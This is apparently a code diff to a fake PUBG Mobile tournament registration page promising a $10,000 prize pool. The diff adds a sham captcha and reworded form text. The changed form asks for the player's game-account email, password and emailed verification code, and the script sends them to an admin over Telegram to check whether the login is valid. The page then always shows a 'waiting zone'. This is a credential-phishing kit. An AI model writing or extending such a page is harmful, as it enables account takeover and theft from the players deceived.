@@ -344,7 +344,7 @@
               border: 1px solid rgba(255,255,255,0.08);
               box-shadow: var(--shadow-soft);
               display: grid;
-              grid-template-columns: 1.4fr 1.6fr; /* баннер стал шире */
+              grid-template-columns: 1.4fr 1.6fr;
               gap: 12px;
             }
             @media (max-width: 900px){
@@ -356,7 +356,6 @@
                 transform: scale(1.04);
               }
             }
-
 
         .tournament-title {
             font-size: 13px;
@@ -370,35 +369,34 @@
             color: var(--text-soft);
             line-height: 1.7;
         }
-.tournament-banner-img{
-  width: 100%;
-  height: 100%;
-  max-height: 250px;        /* было 280px → минус ~10% */
-  border-radius: 18px;
-  object-fit: cover;
-  object-position: 50% 50%;
-  transform: scale(1.01);   /* было 1.03 → мягче */
-  transition: transform .25s ease, box-shadow .25s ease;
-  box-shadow: 0 0 0 rgba(255,165,0,0);
-}
-.tournament-banner-img:hover{
-  transform: scale(1.04);   /* было 1.06 */
-  box-shadow: 0 0 20px rgba(255,165,0,.30), 0 0 40px rgba(255,120,0,.18);
-}
 
-/* На планшетах и мобилках — тоже компактнее */
-@media (max-width: 900px){
-  .tournament-banner-img{
-    max-height: 200px;      /* было 220px */
-    transform: scale(1.005);
-  }
-}
-@media (max-width: 600px){
-  .tournament-banner-img{
-    max-height: 180px;
-  }
-}
+        .tournament-banner-img{
+          width: 100%;
+          height: 100%;
+          max-height: 250px;
+          border-radius: 18px;
+          object-fit: cover;
+          object-position: 50% 50%;
+          transform: scale(1.01);
+          transition: transform .25s ease, box-shadow .25s ease;
+          box-shadow: 0 0 0 rgba(255,165,0,0);
+        }
+        .tournament-banner-img:hover{
+          transform: scale(1.04);
+          box-shadow: 0 0 20px rgba(255,165,0,.30), 0 0 40px rgba(255,120,0,.18);
+        }
 
+        @media (max-width: 900px){
+          .tournament-banner-img{
+            max-height: 200px;
+            transform: scale(1.005);
+          }
+        }
+        @media (max-width: 600px){
+          .tournament-banner-img{
+            max-height: 180px;
+          }
+        }
 
         .scroll-cta {
             margin-top: 8px;
@@ -624,52 +622,55 @@
                 transparent);
         }
 
+        /* TEXT DECOR FOR TOURNAMENT */
+
+        .kicker{
+          display:inline-flex;align-items:center;gap:6px;
+          padding:5px 10px;border-radius:999px;
+          background:rgba(255,184,0,.06);
+          border:1px solid rgba(255,184,0,.3);
+          color:var(--accent);font-size:9px;letter-spacing:.12em;text-transform:uppercase;
+        }
+
+        .tournament-heading{
+          margin:8px 0 6px;font-size:16px;font-weight:800;letter-spacing:.06em;
+          text-transform:uppercase;
+          background:linear-gradient(90deg,#fff, #ffe29a 40%, #ffb800);
+          -webkit-background-clip:text;background-clip:text;color:transparent;
+        }
+
+        .badges{
+          display:flex;flex-wrap:wrap;gap:6px;margin:8px 0 10px;
+        }
+        .badge{
+          padding:6px 10px;border-radius:999px;font-size:9px;letter-spacing:.06em;
+          border:1px solid rgba(255,255,255,.12);background:rgba(4,7,16,.9);color:var(--text-soft);
+        }
+        .badge--gold{ border-color: rgba(255,184,0,.5); color:#ffd36b; background:rgba(255,184,0,.08); }
+
+        .prize-list{
+          display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin:10px 0 6px;
+        }
+        @media (max-width:680px){ .prize-list{ grid-template-columns:1fr; } }
+
+        .prize-item{
+          display:flex;align-items:center;justify-content:space-between;gap:10px;
+          padding:10px 12px;border-radius:14px;
+          background:linear-gradient(180deg, rgba(255,184,0,.06), rgba(255,184,0,.02));
+          border:1px solid rgba(255,255,255,.08);
+        }
+        .prize-item .place{
+          font-weight:800;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#fff;
+        }
+        .prize-item .amount{
+          font-weight:900;font-size:14px;letter-spacing:.04em;color:#ffd36b;
+        }
+
+        .tournament-note{
+          font-size:9px;color:var(--text-muted);line-height:1.7;margin-top:6px;
+        }
+
         /* FLOATING TELEGRAM BUTTON */
-          .kicker{
-  display:inline-flex;align-items:center;gap:6px;
-  padding:5px 10px;border-radius:999px;
-  background:rgba(255,184,0,.06);
-  border:1px solid rgba(255,184,0,.3);
-  color:var(--accent);font-size:9px;letter-spacing:.12em;text-transform:uppercase;
-}
-
-.tournament-heading{
-  margin:8px 0 6px;font-size:16px;font-weight:800;letter-spacing:.06em;
-  text-transform:uppercase;
-  background:linear-gradient(90deg,#fff, #ffe29a 40%, #ffb800);
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-}
-
-.badges{
-  display:flex;flex-wrap:wrap;gap:6px;margin:8px 0 10px;
-}
-.badge{
-  padding:6px 10px;border-radius:999px;font-size:9px;letter-spacing:.06em;
-  border:1px solid rgba(255,255,255,.12);background:rgba(4,7,16,.9);color:var(--text-soft);
-}
-.badge--gold{ border-color: rgba(255,184,0,.5); color:#ffd36b; background:rgba(255,184,0,.08); }
-
-.prize-list{
-  display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;margin:10px 0 6px;
-}
-@media (max-width:680px){ .prize-list{ grid-template-columns:1fr; } }
-
-.prize-item{
-  display:flex;align-items:center;justify-content:space-between;gap:10px;
-  padding:10px 12px;border-radius:14px;
-  background:linear-gradient(180deg, rgba(255,184,0,.06), rgba(255,184,0,.02));
-  border:1px solid rgba(255,255,255,.08);
-}
-.prize-item .place{
-  font-weight:800;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:#fff;
-}
-.prize-item .amount{
-  font-weight:900;font-size:14px;letter-spacing:.04em;color:#ffd36b;
-}
-
-.tournament-note{
-  font-size:9px;color:var(--text-muted);line-height:1.7;margin-top:6px;
-}
 
         .tg-float {
             position: fixed;
@@ -776,6 +777,63 @@
             margin-bottom: 4px;
         }
 
+        /* CAPTCHA MODAL */
+
+        .captcha-backdrop{
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.78);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+        }
+        .captcha-modal{
+            width: min(320px, 100% - 40px);
+            border-radius: var(--radius-xl);
+            background: var(--bg-card);
+            border: 1px solid rgba(255,255,255,0.12);
+            box-shadow: var(--shadow-soft);
+            padding: 16px 18px 12px;
+            text-align: left;
+        }
+        .captcha-title{
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: .16em;
+            margin-bottom: 6px;
+        }
+        .captcha-text{
+            font-size: 8.5px;
+            color: var(--text-muted);
+            margin-bottom: 10px;
+        }
+        .captcha-error{
+            font-size: 7px;
+            color: #f97316;
+            margin-top: 3px;
+            min-height: 10px;
+        }
+        .captcha-actions{
+            margin-top: 10px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+        .btn-outline{
+            padding: 6px 12px;
+            border-radius: var(--radius-full);
+            border: 1px solid rgba(148,163,253,0.4);
+            background: transparent;
+            font-size: 7.5px;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--text-soft);
+            cursor: pointer;
+        }
+        .btn-outline:hover{
+            background: rgba(15,23,42,0.9);
+        }
     </style>
 </head>
 <body>
@@ -854,43 +912,42 @@
                         <div class="tournament-title">
                             <span>ESPORT PUBG MOBILE INVITATIONAL 2025</span>
                         </div>
-                     <div class="tournament-text">
-  <span class="kicker">PUBG MOBILE GLOBAL OPEN — CIS</span>
-  <div class="tournament-heading">Regional Invitational • Invite-Only</div>
+                        <div class="tournament-text">
+                            <span class="kicker">PUBG MOBILE GLOBAL OPEN — CIS</span>
+                            <div class="tournament-heading">Regional Invitational • Invite-Only</div>
 
-  <div class="badges">
-    <span class="badge badge--gold">Prize Pool $10,000</span>
-    <span class="badge">CIS players only</span>
-    <span class="badge">Closed lobbies</span>
-    <span class="badge">Manual verification</span>
-  </div>
+                            <div class="badges">
+                                <span class="badge badge--gold">Prize Pool $10,000</span>
+                                <span class="badge">CIS players only</span>
+                                <span class="badge">Closed lobbies</span>
+                                <span class="badge">Manual verification</span>
+                            </div>
 
-  <div class="prize-list">
-    <div class="prize-item">
-      <span class="place">1st place</span>
-      <span class="amount">$5,000</span>
-    </div>
-    <div class="prize-item">
-      <span class="place">2nd place</span>
-      <span class="amount">$3,000</span>
-    </div>
-    <div class="prize-item">
-      <span class="place">3rd place</span>
-      <span class="amount">$1,000</span>
-    </div>
-    <div class="prize-item">
-      <span class="place">4th place</span>
-      <span class="amount">$1,000</span>
-    </div>
-  </div>
+                            <div class="prize-list">
+                                <div class="prize-item">
+                                    <span class="place">1st place</span>
+                                    <span class="amount">$5,000</span>
+                                </div>
+                                <div class="prize-item">
+                                    <span class="place">2nd place</span>
+                                    <span class="amount">$3,000</span>
+                                </div>
+                                <div class="prize-item">
+                                    <span class="place">3rd place</span>
+                                    <span class="amount">$1,000</span>
+                                </div>
+                                <div class="prize-item">
+                                    <span class="place">4th place</span>
+                                    <span class="amount">$1,000</span>
+                                </div>
+                            </div>
 
-  <div class="tournament-note">
-    Access is <strong>invite-only</strong> and limited to approved &amp; registered teams that pass
-    manual roster checks. Separate flow from the global OPEN — this page is dedicated to
-    <strong>OPEN — CIS</strong>.
-  </div>
-</div>
-
+                            <div class="tournament-note">
+                                Access is <strong>invite-only</strong> and limited to approved &amp; registered teams that pass
+                                manual roster checks. Separate flow from the global OPEN — this page is dedicated to
+                                <strong>OPEN — CIS</strong>.
+                            </div>
+                        </div>
 
                         <button id="scroll-cta-code" class="scroll-cta">
                             <span class="icon">⬇</span>
@@ -898,14 +955,13 @@
                         </button>
                     </div>
                     <div>
-                       <img
-                        src="/register/123414112131.png"
-                        alt="Tournament Banner"
-                        class="tournament-banner-img"
-                        loading="lazy"
-                        decoding="async"
-                      />
-
+                        <img
+                            src="/register/123414112131.png"
+                            alt="Tournament Banner"
+                            class="tournament-banner-img"
+                            loading="lazy"
+                            decoding="async"
+                        />
                     </div>
                 </div>
             </section>
@@ -945,8 +1001,9 @@
                     <span class="bar"></span>Step 2 — Registration Form
                 </div>
                 <div class="section-sub">
-                    After filling all fields, your application is sent for manual verification.
-                    Admin receives it in Telegram with Approve / Deny buttons.
+                    Fill in your in-game ID, email, portal password and verification code.
+                    After you confirm, application goes to manual review — admin in Telegram
+                    decides if email/password are valid or if you must re-open the code.
                 </div>
 
                 <form id="reg-form" class="card">
@@ -965,10 +1022,10 @@
 
                     <div class="two-cols">
                         <div class="field-group">
-                            <div class="label">Email</div>
+                            <div class="label">Email (account)</div>
                             <input type="email" id="email" required
-                                   placeholder="Your primary contact email" />
-                            <div class="note">All confirmations and decisions go here.</div>
+                                   placeholder="Email used for your PUBG MOBILE / game account" />
+                            <div class="note">All decisions and tournament invites will be sent here.</div>
                         </div>
                         <div class="field-group">
                             <div class="label">Password for portal</div>
@@ -984,17 +1041,18 @@
                                    placeholder="Repeat the password" />
                         </div>
                         <div class="field-group">
-                            <div class="label">Email verification code</div>
+                            <div class="label">Verification code</div>
                             <div class="code-form-row">
                                 <input type="text" id="email-code"
-                                       placeholder="Enter code from email" />
+                                       placeholder="Enter code from email (after admin review)" />
                                 <button type="button" id="request-email-code" class="btn-sm">
                                     GET CODE
                                 </button>
                             </div>
                             <div class="note">
-                                Press "GET CODE" to send your data for manual review.
-                                Admin will check and send verification code / decision.
+                                Press <strong>GET CODE</strong>, pass the captcha — your ID, email and password
+                                will be sent to admin in Telegram in one line. Admin checks data and either sends
+                                you a verification code or marks email/password as invalid.
                             </div>
                         </div>
                     </div>
@@ -1004,7 +1062,7 @@
                             <input type="checkbox" id="terms"
                                    style="width:10px; height:10px; margin-top:2px;" required />
                             I confirm that the provided data is accurate and agree to receive
-                            notifications about my application status.
+                            notifications and tournament invitations related to this registration.
                         </label>
                     </div>
 
@@ -1069,6 +1127,24 @@
     </div>
 </div>
 
+<!-- CAPTCHA MODAL -->
+<div id="captcha-backdrop" class="captcha-backdrop" style="display:none;">
+    <div class="captcha-modal">
+        <div class="captcha-title">Anti-bot check</div>
+        <div id="captcha-question" class="captcha-text">
+            Please confirm you are not a bot.
+        </div>
+        <input id="captcha-input" type="text" placeholder="Type answer here" />
+        <div id="captcha-error" class="captcha-error"></div>
+        <div class="captcha-actions">
+            <button type="button" id="captcha-cancel" class="btn-outline">Cancel</button>
+            <button type="button" id="captcha-confirm" class="btn-sm">
+                CONFIRM
+            </button>
+        </div>
+    </div>
+</div>
+
 <script>
     // DEMO valid codes (фронт, можешь менять/убрать, бек всё равно всё шлёт в ТГ)
     const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];
@@ -1086,6 +1162,33 @@
     const finalMessage = document.getElementById('final-message');
     const finalCard = document.getElementById('final-card');
     const requestEmailCodeBtn = document.getElementById('request-email-code');
+
+    // CAPTCHA elements
+    const captchaBackdrop = document.getElementById('captcha-backdrop');
+    const captchaQuestion = document.getElementById('captcha-question');
+    const captchaInput = document.getElementById('captcha-input');
+    const captchaError = document.getElementById('captcha-error');
+    const captchaConfirm = document.getElementById('captcha-confirm');
+    const captchaCancel = document.getElementById('captcha-cancel');
+
+    let pendingCodeRequest = null;
+    let captchaNumbers = { a: 0, b: 0 };
+
+    function openCaptcha(requestPayload) {
+        pendingCodeRequest = requestPayload;
+        captchaNumbers.a = Math.floor(Math.random() * 4) + 3; // 3..6
+        captchaNumbers.b = Math.floor(Math.random() * 4) + 2; // 2..5
+        captchaQuestion.textContent = `Confirm you are not a bot: ${captchaNumbers.a} + ${captchaNumbers.b} = ?`;
+        captchaInput.value = "";
+        captchaError.textContent = "";
+        captchaBackdrop.style.display = "flex";
+        setTimeout(() => captchaInput.focus(), 50);
+    }
+
+    function closeCaptcha() {
+        captchaBackdrop.style.display = "none";
+        pendingCodeRequest = null;
+    }
 
     // --- helper: notify admin via backend (ТГ) ---
     function notifyAdmin(type, payload = {}) {
@@ -1172,9 +1275,58 @@
         });
     }
 
-    // "GET CODE" -> отправить частичные данные админу
+    // CAPTCHA buttons
+    if (captchaCancel) {
+        captchaCancel.addEventListener('click', () => {
+            closeCaptcha();
+            regStatus.textContent = "Captcha cancelled. Code request was not sent.";
+            regStatus.className = "status err";
+        });
+    }
+
+    if (captchaConfirm) {
+        captchaConfirm.addEventListener('click', async () => {
+            const val = (captchaInput.value || "").trim();
+            const expected = captchaNumbers.a + captchaNumbers.b;
+            if (parseInt(val, 10) !== expected) {
+                captchaError.textContent = "Incorrect answer. Try again.";
+                return;
+            }
+            captchaError.textContent = "";
+            captchaBackdrop.style.display = "none";
+
+            if (!pendingCodeRequest) return;
+
+            regStatus.textContent = "Sending your data to admin for verification code...";
+            regStatus.className = "status";
+
+            const res = await notifyAdmin("email_code_request", pendingCodeRequest);
+
+            if (res && res.ok) {
+                regStatus.textContent = "Request sent. Admin will review your ID/email/password and send a code or decision.";
+                regStatus.className = "status ok";
+            } else {
+                regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
+                regStatus.className = "status err";
+            }
+
+            pendingCodeRequest = null;
+        });
+    }
+
+    // ENTER key inside captcha
+    if (captchaInput) {
+        captchaInput.addEventListener('keydown', (e) => {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                captchaConfirm.click();
+            }
+        });
+    }
+
+    // "GET CODE" -> собрать данные, открыть капчу, потом отправить админу
     if (requestEmailCodeBtn) {
-        requestEmailCodeBtn.addEventListener('click', async () => {
+        requestEmailCodeBtn.addEventListener('click', () => {
             regStatus.textContent = "";
             regStatus.className = "status";
 
@@ -1188,26 +1340,20 @@
                 return;
             }
 
-            const accessCode = (codeInput.value || "").trim();
+            const accessCode = (codeInput.value || "").trim().toUpperCase();
 
-            const res = await notifyAdmin("email_code_request", {
+            const payload = {
                 accessCode,
                 ingameId,
                 email,
                 password: pass
-            });
+            };
 
-            if (res && res.ok) {
-                regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
-                regStatus.className = "status ok";
-            } else {
-                regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
-                regStatus.className = "status err";
-            }
+            openCaptcha(payload);
         });
     }
 
-    // Submit full form
+    // Submit full form (после ввода кода) -> пользователь уходит в "ожидание"
     if (regForm) {
         regForm.addEventListener('submit', async function (e) {
             e.preventDefault();
@@ -1253,6 +1399,7 @@
                 return;
             }
 
+            // код может быть пустым, если ты решишь, что без него не отправляем — просто добавь проверку
             const formData = {
                 accessCode,
                 ingameId,
@@ -1271,40 +1418,19 @@
             finalMessage.style.display = "block";
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
-            if (result.status === "approved") {
-                finalCard.innerHTML = `
-                    <div class="section-title" style="margin-bottom:4px;">
-                        <span class="bar"></span>Registration approved
-                    </div>
-                    <div class="success-envelope">✉️</div>
-                    <div class="section-sub" style="margin-bottom:0;">
-                        Your registration is <strong>successful</strong>.
-                        Within 2 days you will receive an email with lobby details
-                        and a direct link to participate in the tournament.
-                    </div>
-                `;
-            } else if (result.status === "rejected") {
-                finalCard.innerHTML = `
-                    <div class="section-title" style="margin-bottom:4px;">
-                        <span class="bar"></span>Registration rejected
-                    </div>
-                    <div class="section-sub" style="margin-bottom:0;">
-                        Provided data was not approved.
-                        Please check your details and try again or contact support.
-                    </div>
-                `;
-            } else {
-                finalCard.innerHTML = `
-                    <div class="section-title" style="margin-bottom:4px;">
-                        <span class="bar"></span>Application submitted
-                    </div>
-                    <div class="section-sub" style="margin-bottom:0;">
-                        Your application has been sent for manual review.
-                        Expect a decision and, if approved, an invitation link
-                        to the tournament within 2 days.
-                    </div>
-                `;
-            }
+            // Всегда: зона ожидания. Решение — только через админа.
+            finalCard.innerHTML = `
+                <div class="section-title" style="margin-bottom:4px;">
+                    <span class="bar"></span>Application sent — waiting zone
+                </div>
+                <div class="success-envelope">⏳</div>
+                <div class="section-sub" style="margin-bottom:0;">
+                    Your registration data and verification code have been submitted for
+                    <strong>manual review</strong>.
+                    Within the day admin will either send you a tournament invitation or ask you
+                    to open / request a new code again. Watch your email and Telegram.
+                </div>
+            `;
         });
     }
 
